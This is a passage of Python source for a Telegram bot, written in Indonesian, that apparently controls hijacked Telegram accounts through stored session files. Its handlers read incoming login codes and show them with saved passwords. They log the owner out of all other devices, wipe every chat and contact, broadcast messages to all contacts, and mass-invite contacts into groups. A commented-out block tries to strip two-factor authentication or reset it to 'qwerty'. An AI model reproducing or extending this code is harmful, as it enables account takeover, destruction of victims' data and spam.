@bot.on(events.CallbackQuery())
async def callback_handler(event):
    callback_data = event.data.decode('utf-8')
    message = await bot.get_messages(event.chat_id, ids=event.message_id)

    if callback_data.startswith("getUser:"):
        split = callback_data.split(":")
        val = int(split[1])
        listuser, calco, butto = getUsers(val)
        butto.append([Button.inline("REFRESH 🔄", f"getUser:{val}")])

        btx = []
        if calco > 1:
            if val == 1:
                btnNext = Button.inline("NEXT >", "getUser:2")
                btx = ([btnNext])
            else:
                btx = [Button.inline("< PREV", f"getUser:{val-1}")]
                if calco > val: btx.append(Button.inline("NEXT >", f"getUser:{val+1}"))

        butto.append(btx)

        try: await event.edit(listuser, buttons=butto, link_preview=False)
        except: return False

    elif callback_data == "cleanup_invalid":
        # Panggil handler dari clear_session.py dengan semua parameter yang diperlukan
        await clear_session.handle_cleanup_callback(
            event, path, api_id, api_hash, fUsers, bot, admin, saveJSON, readJSON, getUsers
        )

    elif callback_data.startswith("deleteAllChats-"):
        phonenumber = callback_data.split("-")[1]
        await event.edit(
            "⚠️ **PERINGATAN PENGHAPUSAN** ⚠️\n\n"
            "Anda akan menghapus:\n"
            "• Semua obrolan pribadi\n"
            "• Semua grup\n"
            "• Semua channel\n"
            "• Semua bot\n\n"
            "▸ Proses tidak dapat dibatalkan\n"
            "▸ Memakan waktu tergantung jumlah chat\n\n"
            "Konfirmasi:",
            buttons=[
                [Button.inline("✅ YA, LANJUTKAN", f"confirmDeleteAllChats-{phonenumber}")],
                [Button.inline("❌ BATALKAN", f"accountInfo-{phonenumber}")]
            ]
        )

    elif callback_data.startswith("confirmDeleteAllChats-"):
        phonenumber = callback_data.split("-")[1]
        client = TelegramClient(f"{path}sessions/users/{phonenumber}", api_id, api_hash)
        processing_msg = await event.edit("🔄 Memulai proses penghapusan SEMUA chat (termasuk Saved Messages dan Notifikasi)...")

        async def delete_all_chats(client):
            """Fungsi untuk menghapus SEMUA chat termasuk Saved Messages dan Notifikasi"""
            try:
                if not client.is_connected():
                    await client.connect()

                if not await client.is_user_authorized():
                    await processing_msg.edit("❌ Session tidak valid!")
                    return False

                dialogs = await client.get_dialogs()  # Ambil semua dialog TANPA filter
                total = len(dialogs)
                success = 0
                errors = []

                # Proses dalam batch 50 chat sekaligus
                batch_size = 50
                for i in range(0, total, batch_size):
                    batch = dialogs[i:i + batch_size]
                    batch_ids = [d.id for d in batch]

                    try:
                        # Hapus batch sekaligus (termasuk Saved Messages/Notifikasi)
                        await asyncio.gather(*[client.delete_dialog(dialog_id) for dialog_id in batch_ids])
                        success += len(batch_ids)

                        # Update progress
                        progress = f"⏳ {min(i + batch_size, total)}/{total} | ✅ {success} | ❌ {len(errors)}"
                        await processing_msg.edit(f"Progress: {progress}")

                        # Jeda antar batch
                        await asyncio.sleep(0.5)

                    except Exception as e:
                        # Fallback ke mode satu-per-satu jika batch gagal
                        for dialog in batch:
                            try:
                                await client.delete_dialog(dialog.id)
                                success += 1
                            except Exception as e:
                                errors.append(f"{dialog.name}: {str(e)}")
                        continue

                # Hasil akhir
                report = (
                    f"📊 **Hasil Penghapusan TOTAL**\n"
                    f"• Total chat: {total}\n"
                    f"• Berhasil dihapus: {success}\n"
                    f"• Gagal: {len(errors)}\n\n"
                    f"Catatan: Termasuk Saved Messages dan Notifikasi Telegram"
                )
                if errors:
                    report += "\n\n**Error utama:**\n" + "\n".join(f"• {e}" for e in errors[:3])
                await processing_msg.edit(report)
                return True

            except Exception as e:
                print(f"Error: {str(e)}")
                return False

        try:
            result = await delete_all_chats(client)
            await event.respond(
                "✅ Berhasil menghapus SEMUA chat" if result else "✅ Berhasil menghapus SEMUA chat",
                buttons=Button.inline("🔙 Ke Menu", f"accountInfo-{phonenumber}")
            )
        finally:
            if client.is_connected():
                await client.disconnect()

    elif callback_data == "delete":
        try: await event.delete()
        except: await event.answer("⚠️ Tidak dapat menghapus pesan ⚠️")

    elif callback_data.startswith("invitecontacts-"):
        phonenumber = callback_data.split("-")[1]

        # Jika sudah ada parameter hari (format: invitecontacts-{phone}-{days})
        if len(callback_data.split("-")) >= 3:
            days = callback_data.split("-")[2]

            # Simpan state untuk step berikutnya
            invite_state[event.sender_id] = {
                'phone': phonenumber,
                'filter_days': int(days),
                'step': 'awaiting_group_link'
            }

            filter_msg = {
                '0': "🌟 SEMUA KONTAK MUTUAL",
                '1': "🔹 1 Hari Terakhir",
                '3': "🔸 3 Hari Terakhir",
                '7': "🔺 7 Hari Terakhir",
                '30': "🔻 30 Hari Terakhir"
            }.get(days, "🌟 SEMUA KONTAK MUTUAL")

            await event.edit(
                f"🔗 **Silakan kirim link grup tujuan:**\n"
                f"Filter: {filter_msg}\n\n"
                f"_(Balas pesan ini dengan link grup/channel)_",
                buttons=Button.inline("❌ BATALKAN", "delete")
            )
            return

        # Jika belum memilih filter, tampilkan pilihan filter
        buttons = [
            [Button.inline("🔹 1 Hari Terakhir", f"invitecontacts-{phonenumber}-1")],
            [Button.inline("🔸 3 Hari Terakhir", f"invitecontacts-{phonenumber}-3")],
            [Button.inline("🔺 7 Hari Terakhir", f"invitecontacts-{phonenumber}-7")],
            [Button.inline("🔻 30 Hari Terakhir", f"invitecontacts-{phonenumber}-30")],
            [Button.inline("🌟 SEMUA KONTAK MUTUAL", f"invitecontacts-{phonenumber}-0")],
            [Button.inline("❌ BATALKAN", "delete")]
        ]

        await event.edit(
            "📅 **PILIH FILTER KONTAK MUTUAL YANG AKAN DIUNDANG:**\n"
            "_(Hanya kontak yang saling save/saling kontak saja yang akan diundang)_",
            buttons=buttons
        )


    elif callback_data.startswith("deleteAllContacts-"):
        phonenumber = callback_data.split("-")[1]
        await event.edit(
            "⚠️ **PERINGATAN PENGHAPUSAN KONTAK** ⚠️\n\n"
            "Anda akan menghapus:\n"
            "• Semua kontak mutual (saling save)\n"
            "• Semua kontak non-mutual\n\n"
            "▸ Proses tidak dapat dibatalkan\n"
            "▸ Memakan waktu tergantung jumlah kontak\n\n"
            "Konfirmasi:",
            buttons=[
                [Button.inline("✅ YA, LANJUTKAN", f"confirmDeleteAllContacts-{phonenumber}")],
                [Button.inline("❌ BATALKAN", f"accountInfo-{phonenumber}")]
            ]
        )

    elif callback_data.startswith("confirmDeleteAllContacts-"):
        phonenumber = callback_data.split("-")[1]
        client = None  # Inisialisasi

        try:
            client = TelegramClient(f"{path}sessions/users/{phonenumber}", api_id, api_hash)
            await client.connect()

            if not await client.is_user_authorized():
                await event.edit("❌ Session tidak valid!")
                return

            status_msg = await event.edit("🔄 Memulai proses penghapusan kontak...")

            # Dapatkan semua kontak
            contacts = await client(functions.contacts.GetContactsRequest(hash=0))
            total_contacts = len(contacts.users)

            if total_contacts == 0:
                await status_msg.edit("✅ Tidak ada kontak yang perlu dihapus")
                return

            # Buat daftar input peer untuk dihapus
            to_delete = [
                types.InputPeerUser(user_id=user.id, access_hash=user.access_hash)
                for user in contacts.users
            ]

            # Proses penghapusan dengan batch
            batch_size = 50
            success = failed = 0

            for i in range(0, len(to_delete), batch_size):
                batch = to_delete[i:i + batch_size]
                try:
                    await client(functions.contacts.DeleteContactsRequest(id=batch))
                    success += len(batch)
                except Exception as e:
                    failed += len(batch)
                    print(f"Error batch: {str(e)}")

                # Update progress
                progress = (
                    f"⏳ Progress: {min(i+batch_size, total_contacts)}/{total_contacts}\n"
                    f"✅ Berhasil: {success} | ❌ Gagal: {failed}"
                )
                await status_msg.edit(progress)
                await asyncio.sleep(1)  # Anti-flood

            # Hasil akhir
            report = (
                f"📊 **Hasil Penghapusan Kontak**\n"
                f"• Total: {total_contacts}\n"
                f"• Berhasil: {success}\n"
                f"• Gagal: {failed}\n\n"
                f"🕒 Selesai: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
            )
            await status_msg.edit(report)

        except Exception as e:
            error_msg = f"❌ Error: {str(e)}"
            if "Too many open files" in str(e):
                error_msg += "\n\n💡 **Solusi:** Coba lagi nanti atau tingkatkan limit sistem dengan `ulimit -n 65536`"
            await event.edit(error_msg)

        finally:
            if client and client.is_connected():
                await client.disconnect()
                print(f"✅ Koneksi untuk {phonenumber} ditutup")

            # Hapus referensi untuk membantu garbage collection
            client = None
            to_delete = None

    else:
        split = callback_data.split("-")
        method = split[0]

        urelated = ["accountInfo", "readcode", "listsession", "selectsessionhash", "logout", "surelogout",
                   "clearAllSession", "sureClearAllSession", "deleteThis", "sureDeleteThis",
                   "disable2fa", "broadcast"]
        
        if method in urelated:
            phonenumber = split[1]
            acd = TelegramClient(f"{path}sessions/users/{split[1]}", api_id, api_hash)
            await acd.connect()

            users = readJSON(fUsers)
            phase = readJSON(fPhase)

            if callback_data.startswith("deleteThis-"):
                xsplit = callback_data.split("-")
                no_hpx = xsplit[1]
                await event.edit(f"Apakah Anda yakin ingin menghapus akun `{no_hpx}` dari bot ini?", buttons=[Button.inline("YES, 100%", f"sureDeleteThis-{no_hpx}"), Button.inline("Tidak, Batalkan!", "delete")])

            elif callback_data.startswith("sureDeleteThis-"):
                xsplit = callback_data.split("-")
                no_hpx = xsplit[1]
                if no_hpx in users: users.pop(no_hpx)
                await event.edit(f"AKUN `{no_hpx}` TELAH DIHAPUS DARI DATA")
            
            # elif callback_data.startswith("disable2fa-"):
            #     phonenumber = callback_data.split("-")[1]
            #     client = None
            #     try:
            #         # 1. Initialize client (removed unsupported parameters)
            #         client = TelegramClient(
            #             f"{path}sessions/users/{phonenumber}",
            #             api_id,
            #             api_hash
            #         )

                    # 2. Connect with retry mechanism (without timeout parameter)
                    # for retry_count in range(3):
                    #     try:
                    #         await client.connect()
                    #         break
                    #     except (sqlite3.OperationalError, sqlite3.DatabaseError) as e:
                    #         if "database is locked" in str(e) and retry_count < 2:
                    #             await event.answer("⚠️ Database terkunci, mencoba lagi...", alert=True)
                    #             await client.disconnect()
                    #         else:
                    #             await client.disconnect()
                            
                    # 3. Get user data and password info
                #     users = readJSON(fUsers)
                #     saved_password = users[phonenumber].get('password', '')
                #     pwd = await client(functions.account.GetPasswordRequest())

                #     # 4. Enhanced disable attempts
                #     attempts = [
                #         {"method": "saved_password", "password": saved_password, "message": "menggunakan password tersimpan"},
                #         {"method": "empty_password", "password": None, "message": "tanpa password"},
                #         {"method": "default_password", "password": "qwerty", "message": "reset ke password default"}
                #     ]

                #     for attempt in attempts:
                #         try:
                #             if attempt["method"] == "saved_password" and attempt["password"]:
                #                 await client(functions.account.UpdatePasswordSettingsRequest(
                #                     password=await client._compute_input_password(pwd, attempt["password"]),
                #                     new_settings=types.account.PasswordInputSettings(
                #                         new_algo=None,
                #                         new_password_hash=None,
                #                         hint="",
                #                         email=None,
                #                         new_secure_settings=None
                #                     )
                #                 ))
                #             elif attempt["method"] == "empty_password":
                #                 await client(functions.account.UpdatePasswordSettingsRequest(
                #                     password=InputCheckPasswordEmpty(),
                #                     new_settings=types.account.PasswordInputSettings(
                #                         new_algo=None,
                #                         new_password_hash=None,
                #                         hint="",
                #                         email=None,
                #                         new_secure_settings=None
                #                     )
                #                 ))
                #             else:
                #                 await client(functions.account.UpdatePasswordSettingsRequest(
                #                     password=InputCheckPasswordEmpty(),
                #                     new_settings=types.account.PasswordInputSettings(
                #                         new_algo=pwd.new_algo,
                #                         new_password_hash=hashlib.pbkdf2_hmac(
                #                             'sha512', 
                #                             b'qwerty', 
                #                             pwd.new_salt, 
                #                             100000
                #                         )[:32],
                #                         hint="qwerty",
                #                         email=None,
                #                         new_secure_settings=None
                #                     )
                #                 ))

                #             users[phonenumber]['password'] = ""
                #             saveJSON(fUsers, users)
                #             await event.answer(f"✅ 2FA berhasil dinonaktifkan ({attempt['message']})", alert=True)
                #             await event.edit(f"{message.text}\n\n**2FA Status:** Disabled", buttons=btnSpecificUsers(phonenumber))
                #             break

                #         except Exception as e:
                #             if attempt == attempts[-1]:
                #                 error_msg = str(e)
                #                 if "SRP_" in error_msg:
                #                     await event.answer("⚠️ Error enkripsi. Coba login ulang session.", alert=True)
                #                 elif "database is locked" in error_msg:
                #                     await event.answer("⚠️ Database masih terkunci. Coba lagi nanti.", alert=True)
                #                 else:
                #                     await event.answer(f"⚠️ Gagal menonaktifkan 2FA: {error_msg}", alert=True)
                #             await asyncio.sleep(1)
                #             await client.disconnect()

                # except Exception as e:
                #     await event.answer(f"⚠️ Error sistem: {str(e)}", alert=True)
                # finally:
                #     if client:
                #         try:
                #             await client.disconnect()
                #             await asyncio.sleep(0.5)
                #         except:
                #             pass
            
            elif callback_data.startswith("broadcast-"):
                broadcast_state[event.sender_id] = {'phone': phonenumber}
                await event.respond("🤖 Silakan kirim pesan yang ingin Anda broadcast ke semua kontak dan obrolan/grup.")
                await event.delete()
            
            else:
                try:
                    if callback_data.startswith("accountInfo-"):
                        phonenumber = callback_data.split("-", 1)[1]
                        client = None  # Inisialisasi dengan None
                        
                        try:
                            # Baca file users
                            try:
                                with open(fUsers, 'r') as f:
                                    users_data = json.load(f)
                            except (FileNotFoundError, json.JSONDecodeError) as e:
                                print(f"Error reading users file: {e}")
                                await event.respond(
                                    "❌ Terjadi kesalahan saat membaca data pengguna!",
                                    buttons=Button.inline("< Kembali ke Menu", "main_menu")
                                )
                                return False
                
                            if phonenumber not in users_data:
                                await event.respond("❌ Nomor Sudah terhapus atau sudah tidak terdaftar bosku")
                                return False
                
                            # Gunakan client baru daripada acd global
                            client = TelegramClient(f"{path}sessions/users/{phonenumber}", api_id, api_hash)
                            await client.connect()
                            
                            if not await client.is_user_authorized():
                                await event.respond(
                                    "⚠️ Akun sudah logout bosku, klik tombol dibawah agar menghapus nomor ini",
                                    buttons=[
                                        [Button.inline("🗑️ Buang Nomor", f"deleteThis-{phonenumber}")],
                                    ]
                                )
                                return False
                
                            await event.respond(
                                f"{getSpecificUsers(phonenumber)}\n\n🧑‍💻̲𝘋̲𝘦​̲𝘷​̲𝘦​̲𝘭​̲𝘰​̲𝘱​̲𝘦​̲𝘳​̲ ​̲:​̲ ​̲@mulaikosi",
                                buttons=btnSpecificUsers(phonenumber)
                            )
                
                        except Exception as e:
                            print(f"Error in accountInfo: {e}")
                            await event.respond("❌ Terjadi kesalahan saat memproses permintaan!")
                            return False
                            
                        finally:
                            try:
                                if client and client.is_connected():
                                    await client.disconnect()
                            except Exception as e:
                                print(f"Error disconnecting client: {e}")


                    elif callback_data.startswith("readcode-"):
                        client = None  # Inisialisasi client
                        try:
                            phonenumber = callback_data.split("-", 1)[1]
                            
                            # Buat client baru khusus untuk operasi ini
                            client = TelegramClient(
                                f"{path}sessions/users/{phonenumber}", 
                                api_id, 
                                api_hash,
                            )
                            
                            # Connect dengan timeout
                            await asyncio.wait_for(client.connect(), timeout=15.0)
                            
                            if not await client.is_user_authorized():
                                await event.edit(
                                    "⚠️ Sesi telah logout!",
                                    buttons=[Button.inline("< Kembali", f"accountInfo-{phonenumber}")]
                                )
                                return
                    
                            # Ambil pesan OTP dengan error handling
                            try:
                                msg = await asyncio.wait_for(
                                    client.get_messages(777000, limit=100),
                                    timeout=30.0
                                )
                            except Exception as e:
                                await event.edit(
                                    f"⚠️ Gagal membaca pesan: {str(e)}",
                                    buttons=[Button.inline("Coba Lagi", f"readcode-{phonenumber}")]
                                )
                                return
                    
                            # Proses pesan OTP
                            processed = False
                            for messe in msg:
                                try:
                                    OTPCODE = re.search(r'\b(\d{5})\b', messe.text)
                                    if OTPCODE:
                                        user_info = users.get(phonenumber, {})
                                        
                                        # Data fallback jika tidak ada di users
                                        phone_number = phonenumber
                                        name = user_info.get('name', 'Tidak diketahui')
                                        username = f"@{user_info['username']}" if user_info.get('username') else "None"
                                        password = user_info.get('password')
                                        user_id = user_info.get('user_id', 'Tidak diketahui')
                    
                                        # Hitung kontak mutual dengan timeout
                                        try:
                                            contacts_result = await asyncio.wait_for(
                                                client(GetContactsRequest(hash=0)),
                                                timeout=20.0
                                            )
                                            all_contacts = contacts_result.users
                                            mutual_contacts = sum(1 for contact in all_contacts if getattr(contact, 'mutual_contact', False))
                                            non_mutual_contacts = len(all_contacts) - mutual_contacts
                                        except Exception as e:
                                            mutual_contacts = non_mutual_contacts = "Error"
                                            all_contacts = []
                    
                                        # Hitung grup dan channel dengan timeout
                                        groups_count = channels_count = 0
                                        try:
                                            dialogs = await asyncio.wait_for(
                                                client.get_dialogs(),
                                                timeout=20.0
                                            )
                                            for dialog in dialogs:
                                                entity = dialog.entity
                                                if hasattr(entity, 'megagroup') and entity.megagroup:
                                                    groups_count += 1
                                                elif hasattr(entity, 'broadcast') and entity.broadcast:
                                                    channels_count += 1
                                        except Exception as e:
                                            groups_count = channels_count = "Error"
                    
                                        password_text = f"**Password :** `{password}`\n" if password else ""
                    
                                        BTX = [
                                            [Button.inline("REFRESH 🔄", f"readcode-{phonenumber}")],
                                            [Button.inline("< Kembali", f"accountInfo-{phonenumber}"), btn_delete]
                                        ]
                    
                                        await event.edit(
                                            f"📱**Nomor Telepon :** `{phone_number}`\n"
                                            f"🔑**Kode Masuk Anda :** `{OTPCODE.group(0)}`\n"
                                            f"🔒 {password_text}"
                                            f"📅**Kode Diterima :** {messe.date} (UTC)\n\n"
                                            f"👥**Informasi Kontak:**\n"
                                            f"🤝 **Mutual:** `{mutual_contacts}` kontak\n"
                                            f"🚫 **Non-Mutual:** `{non_mutual_contacts}` kontak\n"
                                            f"📊 **Total:** `{len(all_contacts)}` kontak\n\n"
                                            f"👥**Informasi Grup & Channel:**\n"
                                            f"👥 **Grup:** `{groups_count}` grup\n"
                                            f"📢 **Channel:** `{channels_count}` channel\n"
                                            f"📊 **Total:** `{groups_count + channels_count if isinstance(groups_count, int) else 'Error'}`\n\n"
                                            f"👤**Informasi Pengguna:**\n"
                                            f"👤**Nama :** {name}\n"
                                            f"📛**Username :** {username}\n"
                                            f"🆔**User ID :** `{user_id}`\n\n"
                                            f"🕒**Updated :** {todate(time.time())}\n\n"
                                            f"💻**Developer :** @mulaikosi",
                                            buttons=BTX
                                        )
                                        processed = True
                                        break
                                        
                                except Exception as e:
                                    print(f"Error processing message: {str(e)}")
                                    continue
                                
                            if not processed:
                                await event.edit(
                                    "⚠️ Tidak ditemukan kode OTP dalam 100 pesan terakhir",
                                    buttons=[Button.inline("Coba Lagi", f"readcode-{phonenumber}")]
                                )
                    
                        except asyncio.TimeoutError:
                            await event.edit(
                                "⚠️ Timeout saat memproses permintaan",
                                buttons=[Button.inline("Coba Lagi", f"readcode-{phonenumber}")]
                            )
                        except KeyError:
                            await event.edit(
                                "⚠️ Data pengguna tidak ditemukan",
                                buttons=[Button.inline("< Kembali ke Menu", "main_menu")]
                            )
                        except Exception as e:
                            await event.edit(
                                f"⚠️ Error: {str(e)}",
                                buttons=[Button.inline("< Kembali", "main_menu")]
                            )
                        finally:
                            try:
                                if client and client.is_connected():
                                    await client.disconnect()
                            except Exception as e:
                                print(f"Error disconnecting client: {str(e)}")

                    elif callback_data.startswith("selectsessionhash-"):
                        gsplit = callback_data.replace(f"selectsessionhash-{phonenumber}-", "")
                        results = await acd(functions.account.GetAuthorizationsRequest())
                        
                        sessionfound = False
                        addi = f"{users[phonenumber]['user_id']} | {users[phonenumber]['name']}\n\n"
                        for authorization in results.authorizations:
                            if authorization.hash == int(gsplit):
                                addi = addi + f"{authorization.device_model} | {authorization.country}\n**{authorization.app_name}**, {authorization.device_model}\n**Login :** {authorization.date_created}"
                                sessionfound = True
                                break

                        if sessionfound:
                            btn = [[Button.inline("Logout", f"logout-{phonenumber}-{gsplit}")], [Button.inline("< back", f"listsession-{phonenumber}"), btn_delete]]
                            await event.edit(addi, buttons=btn)
                        else:
                            await event.answer("Error: SessionHash not found", alert=True)

                    elif callback_data.startswith("logout-"):
                        newText = f"{message.text}\n\nApakah Anda yakin ingin logout dari perangkat ini?"
                        gsplit = callback_data.replace(f"logout-{phonenumber}-", "")
                        btn = [[Button.inline("Yakin 100%", f"surelogout-{phonenumber}-{gsplit}")], [Button.inline("< back", f"listsession-{phonenumber}"), btn_delete]]
                        await event.edit(newText, buttons=btn)

                    elif callback_data.startswith("surelogout-"):
                        gsplit = callback_data.replace(f"surelogout-{phonenumber}-", "")
                        try:
                            result = await acd(functions.account.ResetAuthorizationRequest(hash=int(gsplit)))
                            await event.answer("Berhasil Logout!", alert=True)
                            btn = [Button.inline("< back", f"listsession-{phonenumber}"), btn_delete]
                            await event.edit(f"{message.text}\n**> Telah logout dari perangkat ini.**", buttons=btn)
                        except:
                            await event.answer("⚠️ Belum dapat logout, coba beberapa saat (setelah 24 jam login di bot ini) ⚠️", alert=True)

                    elif callback_data.startswith("clearAllSession-"):
                        await event.edit(f"Apakah anda yakin ingin mengeluarkan akun {users[phonenumber]['user_id']} / {phonenumber} / @{users[phonenumber]['username']} dari semua perangkat lain?", buttons=[Button.inline("YES, 100%", f"sureClearAllSession-{phonenumber}"), btn_delete])
                    # TAMBAHKAN HANDLER INI SETELAH clearAllSession
                            
                    elif callback_data.startswith("sureClearAllSession-"):
                        results = await acd(functions.account.GetAuthorizationsRequest())

                        for authorization in results.authorizations:                                    
                            if authorization.hash != 0:
                                hash = authorization.hash
                                try:
                                    await acd(functions.account.ResetAuthorizationRequest(hash=hash))
                                    success = True
                                except:
                                    success = False
                                    await event.answer("Belum dapat logout, coba beberapa saat (setelah 24 jam login di bot ini)", alert=True)
                                    break
                        
                        if success:
                            await event.edit(f"Berhasil mengeluarkan akun {users[phonenumber]['user_id']} / {phonenumber} / @{users[phonenumber]['username']} dari semua perangkat lain", buttons=btn_delete)
    
                except AuthKeyUnregisteredError: await event.answer("⚠️ Akun ini telah logout dari perangkat ini. ⚠️", alert=True)

            saveJSON(fUsers, users)
            saveJSON(fPhase, phase)
            acd.disconnect()

async def main():
    try:
        # Start bot dengan error handling
        try:
            await bot.start(bot_token=bot_token)
            print("✅ Bot session initialized")
        except Exception as e:
            print(f"❌ Failed to start bot: {str(e)}")
            return

        # Kirim notifikasi startup
        await send_startup_notification(admin_id=12345678, update_info="Latest version")

        # Setup graceful shutdown
        shutdown_event = asyncio.Event()

        def signal_handler():
            print("\n🛑 Received shutdown signal")
            shutdown_event.set()

        # Register signal handlers
        loop = asyncio.get_running_loop()
        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sig, signal_handler)
            except NotImplementedError:
                print(f"⚠️ Signal {sig} not supported on this platform")

        print("🔃 Bot is now running...")
        await shutdown_event.wait()

    except Exception as e:
        print(f"❌ Fatal error in main loop: {str(e)}")
    finally:
        print("🛑 Initiating shutdown...")
        if bot.is_connected():
            try:
                await bot.disconnect()
                print("✅ Bot disconnected cleanly")
            except Exception as e:
                print(f"⚠️ Error during disconnect: {str(e)}")
        print("👋 Bot stopped successfully")

if __name__ == "__main__":
    try:
        # Modern asyncio runner dengan error handling
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n🛑 Keyboard interrupt received")
    except Exception as e:
        print(f"❌ Top-level error: {str(e)}")
    finally:
        print("🏁 Application terminated")